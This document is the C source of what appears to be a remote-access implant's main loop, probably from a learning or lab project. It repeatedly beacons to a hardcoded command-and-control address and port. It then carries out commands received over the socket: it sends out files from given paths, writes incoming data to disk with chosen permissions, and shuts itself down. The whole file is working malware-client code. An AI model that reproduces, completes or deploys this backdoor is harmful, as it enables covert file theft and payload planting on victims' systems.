#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdbool.h>

#include "protocol/req.h"
#include "protocol/req_exfiltration.h"
#include "protocol/req_infiltration.h"
#include "commands.h"

#define CNC_PORT 1337
#define CNC_ADDR "127.0.0.1"

int connect_cnc()
{
    int sockfd = 0;
    int err = 0;
    struct sockaddr_in cnc_addr;

    memset((void *) &cnc_addr, 0, sizeof(cnc_addr));

    cnc_addr.sin_family = AF_INET;
    cnc_addr.sin_port = htons(CNC_PORT);

    if ((err = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("Failed to create socket");
        return err;
    }

    sockfd = err;

    if ((err = inet_pton(cnc_addr.sin_family, CNC_ADDR, &cnc_addr.sin_addr)) <= 0)
    {
        perror("Invalid address");
        return err;
    }

    if ((err = connect(sockfd, (struct sockaddr *) &cnc_addr, sizeof(cnc_addr))) < 0)
    {
        perror("Failed to connect to host");
        return err;
    }

    return sockfd;
}

int main()
{
    int sockfd = 0;
    bool is_suicidal = false;
    req *req;

    while (1)
    {
        while ((sockfd = connect_cnc()) < 0)
        {
            sleep(10);
        }

        puts("Connection successfully established");

        while ((req = read_req(sockfd)) != 0)
        {
            printf("Command Info:\n\ttype: %u\n\trequest length: %zu\n", req->type, req__get_total_size(req));

            switch (req->type)
            {
                case EXF_FILE:
                    puts("File exfiltration command received");

                    exfiltrate_file(sockfd, ((req_exfiltration *) req)->path);

                    req_exfiltration__destroy((req_exfiltration *) req);

                    break;

                case INF_FILE:
                    puts("File infiltration command received");

                    infiltrate_file(sockfd,
                                    ((req_infiltration *) req)->path,
                                    ((req_infiltration *) req)->data,
                                    ((req_infiltration *) req)->data_len,
                                    ((req_infiltration *) req)->perms);

                    req_infiltration__destroy((req_infiltration *) req);

                    break;

                case SUICIDE:
                    puts("Suicide command received");
                    is_suicidal = true;
                    break;

                default:
                    perror("Invalid command");
            }

            free(req);

            if (is_suicidal)
                goto cleanup;
        }
    }

    cleanup:
    close(sockfd);

    return 0;
}
